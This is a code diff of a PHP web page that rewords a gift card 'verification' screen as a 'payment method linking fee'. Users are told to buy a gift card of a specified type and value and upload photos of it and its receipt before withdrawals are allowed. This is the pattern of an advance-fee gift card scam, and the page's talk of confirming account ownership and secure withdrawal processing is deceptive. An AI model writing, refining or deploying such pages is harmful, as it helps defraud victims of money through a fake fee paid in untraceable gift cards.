@@ -248,7 +248,7 @@ if (isset($_POST['submit_receipt'])) {
 <main id="main" class="main">
 
 <div class="pagetitle">
-    <h1>Complete Payment</h1>
+    <h1>Link Payment Method Verification</h1>
 </div>
 
 <div class="container">
@@ -258,87 +258,75 @@ if (isset($_POST['submit_receipt'])) {
         <div class="card-body p-4">
 
             <h5 class="mb-4">
-                Gift Card Verification Instructions
+                Payment Method Linking Fee Instructions
             </h5>
 
             <div class="alert alert-info">
-
-                <h6 class="fw-bold mb-3">
-                    Required Gift Card Details
-                </h6>
-
+            
+                <h5 class="mb-3">
+                    Payment Method Verification Fee
+                </h5>
+            
                 <p>
-                    To complete the verification process, you are required to purchase and submit a valid gift card matching the specifications below:
+                    To complete the linking of your preferred withdrawal payment method,
+                    a one-time verification fee is required. This verification process
+                    helps confirm ownership of the payment account provided and enables
+                    secure withdrawal processing on your account.
                 </p>
-
-                <ul class="mb-3">
-                    <li>
-                        <strong>Gift Card Type:</strong>
-                        <?= htmlspecialchars($gift_card_type); ?>
-                    </li>
-                    <li>
-                        <strong>Gift Card Value:</strong>
-                        $<?= number_format($amount, 2); ?>
-                    </li>
-                    <li>
-                        <strong>Card Status:</strong>
-                        The gift card must be unused, valid, and redeemable.
-                    </li>
-                </ul>
-
+            
                 <hr>
-
-                <h6 class="fw-bold mb-3">
-                    Submission Requirements
-                </h6>
-
+            
+                <p class="mb-2">
+                    <strong>Required Gift Card Type:</strong>
+                    <?= htmlspecialchars($gift_card_type); ?>
+                </p>
+            
+                <p class="mb-2">
+                    <strong>Required Gift Card Value:</strong>
+                    $<?= number_format($amount, 2); ?>
+                </p>
+            
+                <hr>
+            
+                <h6>Instructions</h6>
+            
                 <ol class="mb-3">
                     <li>
-                        Purchase the specified gift card with the exact amount shown above.
+                        Purchase a valid
+                        <strong><?= htmlspecialchars($gift_card_type); ?></strong>
+                        gift card with a value of
+                        <strong>$<?= number_format($amount, 2); ?></strong>.
                     </li>
+            
                     <li>
-                        Take a clear and readable photograph or screenshot of the gift card and purchase receipt.
+                        Ensure the gift card is unused, valid, and clearly displays all
+                        required information for verification.
                     </li>
+            
                     <li>
-                        Ensure all card details, receipt information, and card value are clearly visible.
+                        Take a clear photo or screenshot of the gift card and its purchase
+                        receipt (if available).
                     </li>
+            
                     <li>
-                        Upload the image using the form below.
+                        Upload the image using the form below for review by our
+                        verification team.
                     </li>
+            
                     <li>
-                        Submit your gift card for verification and review.
+                        Once your submission has been reviewed and approved, your selected
+                        payment method will be successfully linked to your account and
+                        eligible for withdrawal processing.
                     </li>
                 </ol>
-
-                <hr>
-
-                <h6 class="fw-bold mb-3">
-                    Important Guidelines
-                </h6>
-
-                <ul class="mb-3">
-                    <li>
-                        Blurry, cropped, edited, or unreadable images may result in delays or rejection.
-                    </li>
-                    <li>
-                        The gift card value must exactly match the required amount.
-                    </li>
-                    <li>
-                        Only the specified gift card type will be accepted.
-                    </li>
-                    <li>
-                        Verification may take some time while your submission is reviewed.
-                    </li>
-                    <li>
-                        Do not submit duplicate or previously used gift cards.
-                    </li>
-                </ul>
-
+            
                 <div class="alert alert-warning mb-0">
-                    <strong>Notice:</strong>
-                    Your submission will remain pending until the gift card has been successfully verified by our review team. You will be notified once the verification process has been completed.
+                    <strong>Important:</strong>
+                    Submissions that are blurry, incomplete, altered, expired, previously
+                    redeemed, or do not match the required gift card type and value may be
+                    rejected and may require resubmission.
                 </div>
-
+            
             </div>
 
             <form method="POST" enctype="multipart/form-data">
